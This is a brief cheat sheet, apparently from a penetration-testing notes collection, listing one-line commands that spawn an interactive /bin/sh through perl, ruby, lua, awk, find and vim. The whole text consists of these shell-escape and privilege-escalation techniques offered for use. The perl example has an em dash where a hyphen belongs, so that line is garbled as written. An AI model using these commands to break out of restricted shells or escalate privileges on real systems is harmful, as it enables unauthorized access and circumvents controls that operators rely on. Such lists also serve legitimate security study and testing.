# Spawning Interactive Shells


```bash
$ perl —e 'exec "/bin/sh";'

ruby: exec "/bin/sh"

lua: os.execute('/bin/sh')

awk 'BEGIN {system("/bin/sh")}'

find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

find . -exec /bin/sh \; -quit

vim -c ':!/bin/sh'

vim
:set shell=/bin/sh
:shell

```
